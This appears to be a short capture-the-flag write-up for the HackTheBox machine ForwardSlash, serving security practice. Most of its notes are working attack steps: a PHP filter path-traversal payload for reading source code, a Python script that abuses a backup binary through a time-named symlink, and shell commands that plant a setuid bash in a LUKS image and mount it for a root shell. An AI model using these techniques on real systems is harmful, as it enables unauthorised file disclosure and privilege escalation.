---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/1V1Xd10SEEY/0.jpg
layout: post
media_subpath: /assets/posts/2020-07-04-forwardslash-hackthebox
tags:
- hackthebox
- linux
- luks
- path traversal
title: ForwardSlash @ HackTheBox
---

ForwardSlash is a 40-point Linux Machine on HackTheBox. We use a path traversal vulnerability to get ssh credentials and abuse a custom backup program to read an old configuration file. For root we mount a custom LUKS image that contains a setuid program.

{% youtube 1V1Xd10SEEY %}

## Notes

**PHP Filter**

```
php://filter/convert.base64-encode/resource=dev/index.php
```

**Backup Tool**

```python
import hashlib
import os
import time

m = hashlib.md5()
m.update(str(time.strftime("%H:%M:%S")))
os.system('ln -s /home/pain/user.txt '+m.hexdigest())
os.system('/usr/bin/backup') 
```

**Luks Local**

```
dd if=/dev/zero of=/tmp/vol bs=1M count=64
sudo cryptsetup -vy luksFormat /tmp/vol
sudo cryptsetup luksOpen /tmp/vol vol
sudo mkfs.ext4 /dev/mapper/vol
sudo mount /dev/mapper/vol /mnt
scp pain@forwardslash.htb:/bin/bash  .
cp bash /mnt/bash; chmod u+s /mnt/bash
sudo umount /mnt && sudo cryptsetup luksClose vol
scp /tmp/vol pain@forwardslash.htb:/tmp/vol
```

**LUKS Remote**

```
sudo cryptsetup luksOpen /tmp/vol backup
cd
mkdir mnt
sudo /bin/mount /dev/mapper/backup ./mnt/
cd mnt; ./bash -p
```